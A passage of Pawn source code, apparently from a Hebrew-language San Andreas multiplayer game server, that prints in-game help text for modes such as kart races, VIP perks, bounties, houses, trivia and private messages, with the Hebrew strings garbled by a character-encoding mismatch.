						SendClientMessage(playerid,orange," * /phone answer - îòðä ìèìôåï");
						SendClientMessage(playerid,orange," * /phone hangup - ðéúå÷ äèìôåï");
						SendClientMessage(playerid,orange," * /phone service - äú÷ùøåú ìùéøåúéí ùåðéí");
					}
				}
				case 30:
				{
					cmd = strtok(cmdtext,idx), num = !strlen(cmd) || !IsNumeric(cmd) ? 0 : strval(cmd);
					if(!num)
					{
						SendClientMessage(playerid,lightblue," ~~~ (30 - Karts - ôòéìåú àåèåîèéú: ÷àøèéðâ) Mode - îåã ~~~");
						SendClientMessage(playerid,pink," .Kart áôòéìåú àåèåîèéú æå, ëì äîöèøôéí ééúðâùå æä áæä òì áðééï àçã âáåä òí øëá îñåâ");
						SendClientMessage(playerid,pink," .îé ùðåôì àå îú ðôñì, åäàçøåï ùðùàø - îðöç åæåëä á40000$");
						SendClientMessage(playerid,purple," » :Kart ô÷åãåú úçøåú ä");
						SendClientMessage(playerid,yellow," /kart");
						SendClientMessage(playerid,grey," /help mode 30 [1] :ìøùéîú ô÷åãåú åäñáø îôåøè òì ðåùà æä äùúîù áô÷åãä");
					}
					if(num == 1)
					{
						SendClientMessage(playerid,lightblue," ~~~ (30 - Karts - ôòéìåú àåèåîèéú: ÷àøèéðâ) Mode Commands [#1] îåã - ôéøåè ô÷åãåú ~~~");
						SendClientMessage(playerid,orange," * /kart state - äðåëçéú Kart áãé÷ú îöá úçøåú ä");
						SendClientMessage(playerid,orange," * /kart join - Kart äöèøôåú ìúçøåú ä");
						SendClientMessage(playerid,orange," * /kart quit - Kart ôøéùä îúçøåú ä");
						if(IsPlayerMAdmin(playerid))
						{
							SendClientMessage(playerid,orange," * /kart start - Kart äúçìú úçøåú");
							SendClientMessage(playerid,orange," * /kart end - Kart ñâéøú úçøåú");
						}
					}
				}
				case 31:
				{
					cmd = strtok(cmdtext,idx), num = !strlen(cmd) || !IsNumeric(cmd) ? 0 : strval(cmd);
					if(!num)
					{
						SendClientMessage(playerid,lightblue," ~~~ (31 - Monster - ôòéìåú àåèåîèéú: îëåðéåú îúðâùåú) Mode - îåã ~~~");
						SendClientMessage(playerid,pink," .Monster áôòéìåú àåèåîèéú æå, ëì ðøùîé äôòéìåú éùåâøå åééúðâùå æä áæä òí øëá îñåâ");
						SendClientMessage(playerid,pink," .îé ùàéáã àú äîëåðéú ééàìõ ìäñúãø òí ëì äîúçøéí äàçøéí");
						SendClientMessage(playerid,pink," .äàçøåï ùðùàø áçééí îðöç åæåëä á25000$");
						SendClientMessage(playerid,purple," » :Monster ô÷åãåú úçøåú ä");
						SendClientMessage(playerid,yellow," /monster");
						SendClientMessage(playerid,grey," /help mode 31 [1] :ìøùéîú ô÷åãåú åäñáø îôåøè òì ðåùà æä äùúîù áô÷åãä");
					}
					if(num == 1)
					{
						SendClientMessage(playerid,lightblue," ~~~ (31 - Monster - ôòéìåú àåèåîèéú: îëåðéåú îúðâùåú) Mode Commands [#1] îåã - ôéøåè ô÷åãåú ~~~");
						SendClientMessage(playerid,orange," * /monster state - äðåëçéú Monster áãé÷ú îöá úçøåú ä");
						SendClientMessage(playerid,orange," * /monster join - Monster äöèøôåú ìúçøåú ä");
						SendClientMessage(playerid,orange," * /monster quit - Monster ôøéùä îúçøåú ä");
						if(IsPlayerMAdmin(playerid))
						{
							SendClientMessage(playerid,orange," * /monster start - Monster äúçìú úçøåú");
							SendClientMessage(playerid,orange," * /monster end - Monster ñâéøú úçøåú");
						}
					}
				}
				case 32:
				{
					cmd = strtok(cmdtext,idx), num = !strlen(cmd) || !IsNumeric(cmd) ? 0 : strval(cmd);
					if(!num)
					{
						SendClientMessage(playerid,lightblue," ~~~ (32 - VIP - îòøëú îùúîùé ëáåã) Mode - îåã ~~~");
						SendClientMessage(playerid,pink," .äéðä îòøëú äîàôùøú ìàãîéðéí áçéøä ùì îùúîùé ëáåã áùøú VIP îòøëú îùúîùé ä");
						SendClientMessage(playerid,pink," ./viplist äîçåáøéí, äùúîùå áô÷åãä VIP î÷áìéí ðù÷éí áçöé îçéø åùéâåø çãù ìîô÷ãä îéåçãú. òì îðú ìøàåú àú çáøé ä VIP ëì çáøé ä");
						SendClientMessage(playerid,purple," » :VIP ô÷åãåú ä");
						SendClientMessage(playerid,yellow," <> VIP Level 0: /viplist  /vbonus /fviplist");
						SendClientMessage(playerid,yellow," <> VIP Level 1: /vip  /camera  /cameraoff  /valarm  /vipcolor");
						SendClientMessage(playerid,yellow," <> VIP Level 2: /vmessage  /vheal");
						SendClientMessage(playerid,yellow," <> VIP Level 3: /vrocket  /vsuicide(/vs)");
						SendClientMessage(playerid,grey," /help mode 32 [1-2] :ìøùéîú ô÷åãåú åäñáø îôåøè òì ðåùà æä äùúîù áô÷åãä");
					}
					if(num == 1)
					{
						SendClientMessage(playerid,lightblue," ~~~ (32 - VIP - îòøëú îùúîùé ëáåã) Mode Commands [#1] îåã - ôéøåè ô÷åãåú ~~~");
						SendClientMessage(playerid,orange," * /viplist - äîçåáøéí VIP öôééä áøùéîú îùúîùé ä");
						SendClientMessage(playerid,orange," * /vbonus - VIP öôééä áøùéîú äáåðåñéí ìîùúîùé ä");
						SendClientMessage(playerid,orange," * /fviplist - âí äìà îçåáøéí ,VIP öôééä áëì îùúîùé ä");
						SendClientMessage(playerid,orange," * /vip - 1 VIP ìøîú ,VIP ùéâåø ìîô÷ãú ä");
						SendClientMessage(playerid,orange," * /camera - 1 VIP ìøîú ,VIP ùéîåù áîöìîåú äàáèçä ùì îô÷ãú ä");
						SendClientMessage(playerid,orange," * /cameraoff - 1 VIP ìøîú ,VIP éöéàä îîöìîåú äàáèçä ùì îô÷ãú ä");
						SendClientMessage(playerid,orange," * /valarm - 1 VIP ìøîú ,VIP äâãøú àôùøåú äàæò÷ä ëàùø ùç÷ðéí ôåìùéí ìîô÷ãú ä");
						SendClientMessage(playerid,orange," * /vipcolor - 1 VIP ìøîú ,VIP äâãøú öáò ä");
						SendClientMessage(playerid,grey," * /help mode 32 2 - ìäîùê");
					}
					if(num == 2)
					{
						SendClientMessage(playerid,lightblue," ~~~ (32 - VIP - îòøëú îùúîùé ëáåã) Mode Commands [#2] îåã - ôéøåè ô÷åãåú ~~~");
						SendClientMessage(playerid,orange," * /vmessage - 2 VIP ìøîú ,VIP éöéøú äåãòú");
						SendClientMessage(playerid,orange," * /vheal - 2 VIP ìøîú ,VIP øéôåé ùç÷ï áòæøú ëåç ä");
						SendClientMessage(playerid,orange," * /vrocket - 3 VIP ùìéçú èéì òì ùç÷ï, ìøîú");
						SendClientMessage(playerid,orange," * /vsuicide (/vs) - 3 VIP ø÷ ëàùø éù îúçú ì 25%% çééí, ìøîú ,VIP äúàáãåú áëåç ä");
					}
				}
				case 33:
				{
					SendClientMessage(playerid,lightblue," ~~~ (33 - Bot - áåè ö'àè) Mode - îåã ~~~");
					SendClientMessage(playerid,pink," .áùøú ÷ééí \"ö'àè-áåè\" àùø éëåì ìòðåú åìòæåø ìùç÷ðéí ëîå ùç÷ï øâéì");
					SendClientMessage(playerid,pink," ðéúï ìãáø òí äáåè (ò\"é äëðñú ùîå áúåê ääåãòä), ìùàåì àåúå ùàìåú");
					SendClientMessage(playerid,pink," .åàó ì÷áì îîðå ëñó - ø÷ àí úá÷ùå éôä");
					format(string,sizeof(string)," » .%s ùí äáåè äðåëçé äåà",botname);
					SendClientMessage(playerid,purple,string);
					SendClientMessage(playerid,boton? green:red,boton? (" » .äáåè ëøâò ôòéì"):(" » .äáåè ëøâò ìà ôòéì"));
					SendClientMessage(playerid,pink," .ùéîå ìá: äáåè ìà éåëì ìòðåú òì ëì ùàìä");
				}
				case 34:
				{
					cmd = strtok(cmdtext,idx), num = !strlen(cmd) || !IsNumeric(cmd) ? 0 : strval(cmd);
					if(!num)
					{
						SendClientMessage(playerid,lightblue," ~~~ (34 - Special Race - ôòéìåú àåèåîèéú: îéøåõ îéåçã) Mode - îåã ~~~");
						SendClientMessage(playerid,pink," .ôòéìåú îéøåõ àåèåîèéú æå àéðä éåöøú îéøåõ øâéì, àìà îéøåõ ììà øëáéí áëìì");
						SendClientMessage(playerid,pink," .äãøê äéðä àøåëä éçñéú, åáä îñòåú äìéëä, ùçééä åàôéìå úòåôä");
						SendClientMessage(playerid,purple," » :ôøñéí");
						SendClientMessage(playerid,yellow," î÷åí øàùåï - 50000$ | î÷åí ùðé - 25000$ | î÷åí ùìéùé - 10000$");
						SendClientMessage(playerid,purple," » :ô÷åãåú äîéøåõ äîéåçã");
						SendClientMessage(playerid,yellow," /srace");
						SendClientMessage(playerid,grey," /help mode 34 [1] :ìøùéîú ô÷åãåú åäñáø îôåøè òì ðåùà æä äùúîù áô÷åãä");
					}
					if(num == 1)
					{
						SendClientMessage(playerid,lightblue," ~~~ (34 - Special Race - ôòéìåú àåèåîèéú: îéøåõ îéåçã) Mode Commands [#1] îåã - ôéøåè ô÷åãåú ~~~");
						SendClientMessage(playerid,orange," * /srace state - áãé÷ú îöá äîéøåõ äîéåçã äðåëçé");
						SendClientMessage(playerid,orange," * /srace join - äöèøôåú ìîéøåõ äîéåçã");
						SendClientMessage(playerid,orange," * /srace quit - ôøéùä îäîéøåõ äîéåçã");
						if(IsPlayerMAdmin(playerid))
						{
							SendClientMessage(playerid,orange," * /srace start - äúçìú îéøåõ îéåçã");
							SendClientMessage(playerid,orange," * /srace end - ñâéøú îéøåõ îéåçã");
						}
					}
				}
				case 35:
				{
					cmd = strtok(cmdtext,idx), num = !strlen(cmd) || !IsNumeric(cmd) ? 0 : strval(cmd);
					if(!num)
					{
						SendClientMessage(playerid,lightblue," ~~~ (35 - Hitman - îòøëú äéèîï) Mode - îåã ~~~");
						SendClientMessage(playerid,pink," ,ô÷åãåú ääéèîï îàôùøåú ìëí ìùéí ëñó òì øàùí ùì ùç÷ðéí");
						SendClientMessage(playerid,pink," .åáëê ìòåãã ùç÷ðéí àçøéí ìäøåâ àåúí");
						SendClientMessage(playerid,pink," .ìäåøâ ùç÷ï ùòìéå éù ëñó ééðúï äñëåí äëñôé ùðîöà òì øàùå ùì àåúå äùç÷ï");
						SendClientMessage(playerid,purple," » :ô÷åãåú îòøëú ääéèîï");
						SendClientMessage(playerid,yellow," /hitman  /bounty");
						SendClientMessage(playerid,grey," /help mode 35 [1] :ìøùéîú ô÷åãåú åäñáø îôåøè òì ðåùà æä äùúîù áô÷åãä");
					}
					if(num == 1)
					{
						SendClientMessage(playerid,lightblue," ~~~ (35 - Hitman - îòøëú äéèîï) Mode Commands [#1] îåã - ôéøåè ô÷åãåú ~~~");
						SendClientMessage(playerid,orange," * /hitman - ìùéí ëñó òì ùç÷ï");
						SendClientMessage(playerid,orange," * /bounty - áãé÷ú ëîåú äëñó òì ùç÷ï");
					}
				}
				case 36:
				{
					cmd = strtok(cmdtext,idx), num = !strlen(cmd) || !IsNumeric(cmd) ? 0 : strval(cmd);
					if(!num)
					{
						SendClientMessage(playerid,lightblue," ~~~ (36 - Bombs - çðåú ôööåú) Mode - îåã ~~~");
						SendClientMessage(playerid,pink," .îòøëú äôööåú áùøúéðå îàôùøú ÷ðééú ôööåú îëì îéðé ñåâéí åîëì î÷åí");
						SendClientMessage(playerid,pink," .ìëì ôööä ëåç åîøç÷ ôâéòä ùåðä");
						SendClientMessage(playerid,pink," .ùéîå ìá: ðéúï ìäçæé÷ ø÷ ôööä àçú");
						SendClientMessage(playerid,pink," .áîéãä åäéðëí îùúîùéí øùåîéí, äôööä ùú÷ðå úùîø âí àí úöàå îäùøú");
						SendClientMessage(playerid,purple," » :ô÷åãåú çðåú äôööåú - îøîä 6 áìáã");
						SendClientMessage(playerid,yellow," /buybomb  /usebomb");
						SendClientMessage(playerid,grey," /help mode 36 [1] :ìøùéîú ô÷åãåú åäñáø îôåøè òì ðåùà æä äùúîù áô÷åãä");
					}
					if(num == 1)
					{
						SendClientMessage(playerid,lightblue," ~~~ (36 - Bombs - çðåú ôööåú) Mode Commands [#1] îåã - ôéøåè ô÷åãåú ~~~");
						SendClientMessage(playerid,orange," * /buybomb - ÷ðééú ôööä");
						SendClientMessage(playerid,orange," * /usebomb - ùéîåù áôööä ù÷ðéú");
					}
				}
				case 37:
				{
					cmd = strtok(cmdtext,idx), num = !strlen(cmd) || !IsNumeric(cmd) ? 0 : strval(cmd);
					if(!num)
					{
						SendClientMessage(playerid,lightblue," ~~~ (37 - Clothes Shop - çðåú áâãéí) Mode - îåã ~~~");
						SendClientMessage(playerid,pink," .áòæøú îòøëú çðåú äáâãéí, ðéúï ìùðåú ãîåú úåê ëãé îùç÷ åáìé ìîåú");
						SendClientMessage(playerid,pink," .ôùåè äëðñå ìçðåú áâãéí åùí àì äö'÷ôåéðè");
						SendClientMessage(playerid,purple," » :ô÷åãåú çðåú äáâãéí");
						SendClientMessage(playerid,yellow," /myskin  /classes  /csrandom");
						SendClientMessage(playerid,grey," /help mode 37 [1] :ìøùéîú ô÷åãåú åäñáø îôåøè òì ðåùà æä äùúîù áô÷åãä");
					}
					if(num == 1)
					{
						SendClientMessage(playerid,lightblue," ~~~ (37 - Clothes Shop - çðåú áâãéí) Mode Commands [#1] îåã - ôéøåè ô÷åãåú ~~~");
						SendClientMessage(playerid,orange," * /myskin - ùéðåé äãîåú ùìê");
						SendClientMessage(playerid,orange," * /classes - îòáø ìîöá áçéøú äãîåéåú");
						SendClientMessage(playerid,orange," * /csrandom - ùéðåé úîåðú áçéøú äãîåéåú ùìê");
					}
				}
				case 38:
				{
					cmd = strtok(cmdtext,idx), num = !strlen(cmd) || !IsNumeric(cmd) ? 0 : strval(cmd);
					if(!num)
					{
						SendClientMessage(playerid,lightblue," ~~~ (38 - Houses - çðåú áúéí) Mode - îåã ~~~");
						SendClientMessage(playerid,pink," .îòøëú äáúéí áùøúéðå îàôùøú ìëì àçã ì÷ðåú áéú àéùé îùìå, åìàøç áå àðùéí");
						SendClientMessage(playerid,pink," .áðåñó ìäéåú îåâï áúåëå îôðé ëì îú÷ôä ëìùäéú îáçåõ");
						SendClientMessage(playerid,purple," » :ô÷åãåú áúéí");
						SendClientMessage(playerid,yellow," /house  /buyhouse  /h  /oh");
						SendClientMessage(playerid,grey," /help mode 38 [1-2] :ìøùéîú ô÷åãåú åäñáø îôåøè òì ðåùà æä äùúîù áô÷åãä");
					}
					if(num == 1)
					{
						SendClientMessage(playerid,lightblue," ~~~ (38 - Houses - çðåú áúéí) Mode Commands [#1] îåã - ôéøåè ô÷åãåú ~~~");
						SendClientMessage(playerid,orange," * /house teleport - ÷áéòú äùéâåø ìáéú");
						SendClientMessage(playerid,orange," * /house giveacc - ðúéðú âéùä ìáéú ùìê");
						SendClientMessage(playerid,orange," * /house removeacc - îçé÷ú âéùä ìáéú ùìê");
						SendClientMessage(playerid,orange," * /house sell - (îëéøú äáéú ùìê (ú÷áì çöé îîçéøå");
						SendClientMessage(playerid,orange," * /house acclist - øùéîú äâéùåú ìáéú ùìê");
						SendClientMessage(playerid,orange," * /house nremoveacc - îçé÷ú âéùä ìáéú ùìê ìùç÷ï ìà îçåáø");
						SendClientMessage(playerid,orange," * /house removeallacc - àéôåñ øùéîú äâéùåú ìáéú ùìê");
						SendClientMessage(playerid,orange," * /buyhouse - ÷ðééú áéú");
						SendClientMessage(playerid,grey," /help mode 38 2 - ìäîùê");
					}
					if(num == 2)
					{
						SendClientMessage(playerid,lightblue," ~~~ (38 - Houses - çðåú áúéí) Mode Commands [#2] îåã - ôéøåè ô÷åãåú ~~~");
						SendClientMessage(playerid,orange," * /h - ùéâåø ìáéú ùìê");
						SendClientMessage(playerid,orange," * /oh - ùéâåø ìáéú ùì îéùäå àçø");
					}
				}
				case 39:
				{
					cmd = strtok(cmdtext,idx), num = !strlen(cmd) || !IsNumeric(cmd) ? 0 : strval(cmd);
					if(!num)
					{
						SendClientMessage(playerid,lightblue," ~~~ (39 - Math - ôòéìåú ö'àè: îúîèé÷ä) Mode - îåã ~~~");
						SendClientMessage(playerid,pink," .îòøëú æå äéðä ôòéìåú ö'àè ìùéôåø îéåîðåú äùç÷ðéí áî÷öåò îúîèé÷ä");
						SendClientMessage(playerid,pink," .äøàùåï ùééòðä ðëåï òì ùàìåú äîúîèé÷ä ùéåôéòå áö'àè, ééæëä áôøñ ëñôé äîåúàí ìøîú ÷åùé äúøâéì");
						SendClientMessage(playerid,purple," » :ô÷åãåú îòøëú äîúîèé÷ä");
						SendClientMessage(playerid,yellow,IsPlayerMAdmin(playerid)? (" /math  /startmath"):(" /math"));
						SendClientMessage(playerid,grey," /help mode 39 [1] :ìøùéîú ô÷åãåú åäñáø îôåøè òì ðåùà æä äùúîù áô÷åãä");
					}
					if(num == 1)
					{
						SendClientMessage(playerid,lightblue," ~~~ (39 - Math - ôòéìåú ö'àè: îúîèé÷ä) Mode Commands [#1] îåã - ôéøåè ô÷åãåú ~~~");
						SendClientMessage(playerid,orange," * /math - ùìéçú îñôø ìôòéìåú äîúîèé÷ä");
						if(IsPlayerMAdmin(playerid)) SendClientMessage(playerid,orange," * /startmath - äúçìú ôòéìåú îúîèé÷ä");
					}
				}
				case 40:
				{
					cmd = strtok(cmdtext,idx), num = !strlen(cmd) || !IsNumeric(cmd) ? 0 : strval(cmd);
					if(!num)
					{
						SendClientMessage(playerid,lightblue," ~~~ (40 - Trivia - ôòéìåú ö'àè: èøéååéä) Mode - îåã ~~~");
						SendClientMessage(playerid,pink," .âí îòøëú æå äéðä ôòéìåú ö'àè. äéà áåã÷ú àú îòîãëí áééãò òì äîùç÷ åòì äîåã");
						SendClientMessage(playerid,pink," .ùàìä úéðúï áö'àè, åúäéä ìëí äùç÷ðéí àôùøåú ìáçåø àú äúùåáä äðëåðä îúåê 3 úùåáåú ùééðúðå");
						SendClientMessage(playerid,pink," .äøàùåï ùééòðä òì ùàìú äèøéååéä áúùåáä ðëåðä éæëä á 5000$");
						SendClientMessage(playerid,purple," » :ô÷åãåú èøéååéä");
						SendClientMessage(playerid,yellow,IsPlayerMAdmin(playerid)? (" /trivia  /starttrivia"):(" /trivia"));
						SendClientMessage(playerid,grey," /help mode 40 [1] :ìøùéîú ô÷åãåú åäñáø îôåøè òì ðåùà æä äùúîù áô÷åãä");
					}
					if(num == 1)
					{
						SendClientMessage(playerid,lightblue," ~~~ (40 - Trivia - ôòéìåú ö'àè: èøéååéä) Mode Commands [#1] îåã - ôéøåè ô÷åãåú ~~~");
						SendClientMessage(playerid,orange," * /trivia - ùìéçú úùåáä ìôòéìåú èøéååéä");
						if(IsPlayerMAdmin(playerid)) SendClientMessage(playerid,orange," * /starttrivia - äúçìú ôòéìåú èøéååéä");
					}
				}
				case 41:
				{
					cmd = strtok(cmdtext,idx), num = !strlen(cmd) || !IsNumeric(cmd) ? 0 : strval(cmd);
					if(!num)
					{
						SendClientMessage(playerid,lightblue," ~~~ (41 - Contact - éöéøú ÷ùø) Mode - îåã ~~~");
						SendClientMessage(playerid,pink," .îòøëú éöéøú ä÷ùø äéðä îòøëú ôùåèä ìéöéøú ÷ùø òí äðäìú ä÷äéìä");
						SendClientMessage(playerid,pink," .úåëìå ìãååç òì áàâéí, ìäöéò äöòåú, åòåã");
						SendClientMessage(playerid,purple," » :ô÷åãåú éöéøú ÷ùø");
						SendClientMessage(playerid,yellow," /bug  /advice  /preport  /areport");
						SendClientMessage(playerid,grey," /help mode 41 [1] :ìøùéîú ô÷åãåú åäñáø îôåøè òì ðåùà æä äùúîù áô÷åãä");
					}
					if(num == 1)
					{
						SendClientMessage(playerid,lightblue," ~~~ (41 - Contact - éöéøú ÷ùø) Mode Commands [#1] îåã - ôéøåè ô÷åãåú ~~~");
						SendClientMessage(playerid,orange," * /bug - ãéååç òì áàâ");
						SendClientMessage(playerid,orange," * /advice - äöòú øòéåï ìùøú");
						SendClientMessage(playerid,orange," * /preport - ãéååç òì ùç÷ï");
						SendClientMessage(playerid,orange," * /areport - ãéååç òì àãîéï");
					}
				}
				case 42:
				{
					cmd = strtok(cmdtext,idx), num = !strlen(cmd) || !IsNumeric(cmd) ? 0 : strval(cmd);
					if(!num)
					{
						SendClientMessage(playerid,lightblue," ~~~ (42 - Super Bonuses - ñåôø áåðåñéí) Mode - îåã ~~~");
						SendClientMessage(playerid,pink," .îòøëú äñåôø áåðåñéí îåøëáú îîñôø çðåéåú áåðåñéí äîåñúøåú áøçáé äîôä");
						SendClientMessage(playerid,pink," .ëàùø úâéòå àì çðåú ñåôø áåðåñéí, éåôéòå áôðéëí ìà îòè àôùøåéåú ì÷ðééú ãáøéí îâðéáéí");
						SendClientMessage(playerid,purple," » :ô÷åãåú çðåú äñåôø áåðåñéí");
						SendClientMessage(playerid,yellow," /sb");
						SendClientMessage(playerid,grey," /help mode 42 [1] :ìøùéîú ô÷åãåú åäñáø îôåøè òì ðåùà æä äùúîù áô÷åãä");
					}
					if(num == 1)
					{
						SendClientMessage(playerid,lightblue," ~~~ (42 - Super Bonuses - ñåôø áåðåñéí) Mode Commands [#1] îåã - ôéøåè ô÷åãåú ~~~");
						SendClientMessage(playerid,orange," * /sb list - øùéîú äñåôø áåðåñéí");
						SendClientMessage(playerid,orange," * /sb buy - ÷ðééú ñåôø áåðåñ");
					}
				}
				case 43:
				{
					cmd = strtok(cmdtext,idx), num = !strlen(cmd) || !IsNumeric(cmd) ? 0 : strval(cmd);
					if(!num)
					{
						SendClientMessage(playerid,lightblue," ~~~ (43 - Private Messages - äåãòåú ôøèéåú) Mode - îåã ~~~");
						SendClientMessage(playerid,pink," .áùøúéðå îòøëú ääåãòåú äôøèéåú äîåáðú äåùîèä, åðåñôä àçú ééçåãéú ùìðå");
						SendClientMessage(playerid,pink," .éçã òí ô÷åãú ääåãòä äôøèéú äîåëøú, äåñôðå ùìì àôùøåéåú ùéîåùéåú");
						SendClientMessage(playerid,pink," :áðåñó äàôùøåú äîéåçãú ùìðå - îòøëú îééì, äîàôùøú ùìéçú äåãòåú âí ìùç÷ðéí ìà îçåáøéí");
						SendClientMessage(playerid,pink," .äùç÷ðéí ôùåè éé÷áìå àú ääåãòåú ëàùø äí ðëðñéí");
						SendClientMessage(playerid,purple," » :ô÷åãåú îòøëú ääåãòåú äôøèéåú");
						SendClientMessage(playerid,yellow," /pm  /r  /lastpm  /pmlist");
						SendClientMessage(playerid,grey," /help mode 43 [1] :ìøùéîú ô÷åãåú åäñáø îôåøè òì ðåùà æä äùúîù áô÷åãä");
					}
					if(num == 1)
					{
						SendClientMessage(playerid,lightblue," ~~~ (43 - Private Messages - äåãòåú ôøèéåú) Mode Commands [#1] îåã - ôéøåè ô÷åãåú ~~~");
						SendClientMessage(playerid,orange," * /private (/pm) - ùìéçú äåãòä ôøèéú");
						SendClientMessage(playerid,orange," * /reply (/r) - äçæøú äåãòä ôøèéú ìùç÷ï äàçøåï ùùìç ìê äåãòä ôøèéú");
						SendClientMessage(playerid,orange," * /lastpm - öôééä áôøèé äùç÷ï äàçøåï àìéå ùìçú äåãòä ôøèéú");
						SendClientMessage(playerid,orange," * /pmlist show - øùéîú ääåãòåú äôøèéåú äàçøåðåú ùìê");
						SendClientMessage(playerid,orange," * /pmlist reset - îçé÷ú øùéîú ääåãòåú äôøèéåú ùìê");
						SendClientMessage(playerid,orange," * /pmlist toggle -  äôñ÷ú / àéôùåø ùîéøú ääåãòåú äôøèéåú ùìê");
					}
				}
				case 44:
				{
					cmd = strtok(cmdtext,idx), num = !strlen(cmd) || !IsNumeric(cmd) ? 0 : strval(cmd);
					if(!num)
					{
						SendClientMessage(playerid,lightblue," ~~~ (44 - Kickstar - Kickstar :ôòéìåú àåèåîèéú) Mode - îåã ~~~");
						SendClientMessage(playerid,pink," .ëì äùç÷ðéí îùåâøéí ìî÷åí àçã, åùí äí î÷áìéí îèøä - ìäùéâ àú îñôø äð÷åãåú äëé âáåä Kickstar áôòéìåú ä");
						SendClientMessage(playerid,pink," òì îðú ìäùéâ ð÷åãåú, òìéëí ìäâéò ëîä ùéåúø îäø ìö'÷ôåéðèéí (ð÷åãåú àãåîåú) ùéåôéòå áî÷åîåú øðãåîàìééí");
						SendClientMessage(playerid,pink," .ìéã äî÷åí áå àúí ðîöàéí, ëîä ùéåúø ð÷åãåú - ëê éåúø ñéëåééí ùúðöçå");
						SendClientMessage(playerid,pink," .äñëåí äëñôé ùîú÷áì ìîðöç äéðå 50000$. áîéãä åéù éåúø îîðöç àçã, äñëåí ééúçì÷ áéï äîðöçéí");
						SendClientMessage(playerid,purple," » :Kickstar ô÷åãåú");
						SendClientMessage(playerid,yellow," /kickstar");
						SendClientMessage(playerid,grey," /help mode 44 [1] :ìøùéîú ô÷åãåú åäñáø îôåøè òì ðåùà æä äùúîù áô÷åãä");
					}
					if(num == 1)
					{
						SendClientMessage(playerid,lightblue," ~~~ (44 - Kickstar - Kickstar :ôòéìåú àåèåîèéú) Mode Commands [#1] îåã - ôéøåè ô÷åãåú ~~~");
						SendClientMessage(playerid,orange," * /kickstar state - äðåëçéú Kickstar áãé÷ú îöá úçøåú ä");
						SendClientMessage(playerid,orange," * /kickstar join - Kickstar äöèøôåú ìúçøåú ä");
						SendClientMessage(playerid,orange," * /kickstar quit - Kickstar ôøéùä îúçøåú ä");
						if(IsPlayerMAdmin(playerid))
						{
							SendClientMessage(playerid,orange," * /kickstar start - Kickstar äúçìú úçøåú");
							SendClientMessage(playerid,orange," * /kickstar end - Kickstar ñâéøú úçøåú ä");
						}
					}
				}
				case 45:
				{
					cmd = strtok(cmdtext,idx), num = !strlen(cmd) || !IsNumeric(cmd) ? 0 : strval(cmd);
					if(!num)
					{
						SendClientMessage(playerid,lightblue," ~~~ (45 - Crane - îòøëú äîðåó) Mode - îåã ~~~");
						SendClientMessage(playerid,pink," .îòøëú äîðåó äééçåãéú ùìðå îàôùøú ùéâåø ìîðåó åáéöåò ôòìåìéí - éçã àéúå");
						SendClientMessage(playerid,pink," ëàùø úùúâøå àì äîðåó, úåëìå ìäñúåáá áëåçåú òöîëí, àå ìáöò ôòìåìéí ùåðéí òí ô÷åãú ôéöåõ");
						SendClientMessage(playerid,pink," .äîåúàîú ìúæåæä ùìëí éçã òí äîðåó");
						SendClientMessage(playerid,pink," .ëîåáï ùçñåîä ùäééä îøåáä òì äîðåó àå ëðéñä ùì éåúø îîùúîù àçã àì äîðåó");
						SendClientMessage(playerid,purple," » :ô÷åãåú îòøëú äîðåó");
						SendClientMessage(playerid,yellow," /crane");
						SendClientMessage(playerid,grey," /help mode 45 [1] :ìøùéîú ô÷åãåú åäñáø îôåøè òì ðåùà æä äùúîù áô÷åãä");
					}
					if(num == 1)
					{
						SendClientMessage(playerid,lightblue," ~~~ (45 - Crane - îòøëú äîðåó) Mode Commands [#1] îåã - ôéøåè ô÷åãåú ~~~");
						SendClientMessage(playerid,orange," * /crane state - áãé÷ú îöá äîðåó");
						SendClientMessage(playerid,orange," * /crane enter - ëðéñä (ùéâåø) àì äîðåó");
						SendClientMessage(playerid,orange," * /crane exit - éöéàä îäîðåó");
						SendClientMessage(playerid,orange," * /crane boom - (éöéøú ôéöåõ (ìúðåôä");
					}
				}
				case 46:
				{
					cmd = strtok(cmdtext,idx), num = !strlen(cmd) || !IsNumeric(cmd) ? 0 : strval(cmd);
					if(!num)
					{
						SendClientMessage(playerid,lightblue," ~~~ (46 - Colors - îòøëú öáòéí) Mode - îåã ~~~");
						SendClientMessage(playerid,pink," .îòøëú äöáòéí äáìòãéú ùìðå úàôùø ìëí ìáçåø ìòöîëí öáòéí îùìëí áî÷åí äöáò äøðãåîàìé áäúçìä");
						SendClientMessage(playerid,pink," .áçéøú äöáòéí îúáöòú áàåôï ðåç å÷ì ìùéîåù");
						SendClientMessage(playerid,purple," » :ô÷åãåú îòøëú äöáòéí");
						SendClientMessage(playerid,yellow," /testrgb  /testcolor  /randomcol  /normalcol  /changecolor  /colors  /clists");
						SendClientMessage(playerid,grey," /help mode 46 [1] :ìøùéîú ô÷åãåú åäñáø îôåøè òì ðåùà æä äùúîù áô÷åãä");
					}
					if(num == 1)
					{
						SendClientMessage(playerid,lightblue," ~~~ (46 - Colors - îòøëú öáòéí) Mode Commands [#1] îåã - ôéøåè ô÷åãåú ~~~");
						SendClientMessage(playerid,orange," * /testrgb - RGB áãé÷ú öáò îñåâ");
						SendClientMessage(playerid,orange," * /testcolor - áãé÷ú öáò ìôé ùí");
						SendClientMessage(playerid,orange," * /randomcol - ùéðåé ìöáò øðãåîàìé");
						SendClientMessage(playerid,orange," * /normalcol - (ùéðåé ìöáò ÷áåò ùùééê ìëí (÷ìàï, âàðâ, öáò ùäú÷áì áäúçìä");
						SendClientMessage(playerid,orange," * /changecolor - ùéðåé öáò ìòöîëí");
						SendClientMessage(playerid,orange," * /colors - øùéîú ùîåú öáòéí ÷áåòéí");
						SendClientMessage(playerid,orange," * /clists - øùéîåú öáòéí ùåðåú");
					}
				}
				case 47:
				{
					SendClientMessage(playerid,lightblue," ~~~ (47 - Reply Test - ôòéìåú ö'àè: îáçï çæøä) Mode - îåã ~~~");
					SendClientMessage(playerid,pink," .ôòéìåú ö'àè æå îàôùøú ìëí ìäúàîï òì ÷ìéèä åëúéáä îäéøä");
					SendClientMessage(playerid,pink," .ëàùø îáçï äçæøä éúçéì, è÷ñè îñåééí ééëúåá áàåôï à÷øàé åòìéëí, äùç÷ðéí ìä÷ìéãå áö'àè");
					SendClientMessage(playerid,pink," .äøàùåï ùééëúåá àú äè÷ñè ùééðúï áö'àè, ééðöç áôòéìåú");
					SendClientMessage(playerid,purple," » :øîåú ÷åùé");
					SendClientMessage(playerid,pink," .áôòéìåú éùðï øîåú ÷åùé - ÷ì, áéðåðé å÷ùä. ëì øîú ÷åùé îáéàä ñëåí ëñó ùåðä ìîðöç");
